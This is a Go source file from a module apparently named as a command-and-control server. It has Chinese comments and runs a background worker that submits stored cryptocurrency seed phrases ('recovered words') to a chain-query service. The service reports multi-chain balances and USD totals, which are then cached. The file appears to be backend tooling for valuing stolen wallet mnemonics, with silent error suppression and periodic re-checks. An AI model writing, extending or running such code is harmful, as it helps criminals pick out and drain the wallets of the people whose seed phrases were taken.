package server

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"time"

	"mockc2/internal/store"
)

// 助记词入库后，后台自动跑 chainquery 查多链余额并缓存到 recovered_words。
// 顺序低速率执行，不阻塞主链；chainquery 不可达时静默跳过（保留待查）。

func StartBalanceWorker() {
	go func() {
		defer func() { _ = recover() }()
		lastRefresh := time.Now()
		for {
			// 按配置间隔（分钟，后台可设）周期性触发全量重查。
			interval := time.Duration(store.GetBalanceIntervalMin()) * time.Minute
			if interval < time.Minute {
				interval = time.Minute
			}
			if time.Since(lastRefresh) >= interval {
				store.ResetWordBalances(0, true)
				lastRefresh = time.Now()
			}
			rows := store.PendingBalanceWords(2)
			if len(rows) == 0 {
				time.Sleep(20 * time.Second)
				continue
			}
			for _, r := range rows {
				id := store.ToInt(r["id"])
				phrase := store.ToStr(r["phrase"])
				js, usd := queryChainquery(phrase)
				if js != "" {
					store.SaveWordBalance(id, js, usd)
				} else {
					// 失败也标记时间，避免死循环重试风暴；可人工/周期重查
					store.SaveWordBalance(id, "", 0)
				}
				time.Sleep(2 * time.Second)
			}
		}
	}()
}

// queryChainquery 调 chainquery 服务：创建任务 → 轮询到完成 → 返回结果 JSON 与美元合计。
func queryChainquery(phrase string) (string, float64) {
	base := chainqueryBase()
	body, _ := json.Marshal(map[string]any{"mnemonics": []string{phrase}, "tokens": true, "prices": true})
	resp, err := http.Post(base+"/api/query", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", 0
	}
	var jr struct {
		Job string `json:"job"`
	}
	_ = json.NewDecoder(resp.Body).Decode(&jr)
	resp.Body.Close()
	if jr.Job == "" {
		return "", 0
	}
	for i := 0; i < 120; i++ { // 最多约 4 分钟
		time.Sleep(2 * time.Second)
		r2, err := http.Get(base + "/api/job?id=" + jr.Job)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(r2.Body)
		r2.Body.Close()
		var job map[string]any
		if json.Unmarshal(b, &job) != nil {
			continue
		}
		if st, _ := job["status"].(string); st == "done" {
			usd := 0.0
			if results, ok := job["results"].([]any); ok && len(results) > 0 {
				if m, ok := results[0].(map[string]any); ok {
					usd = store.ToFloat(m["total_usd"])
				}
			}
			return string(b), usd
		}
	}
	return "", 0
}
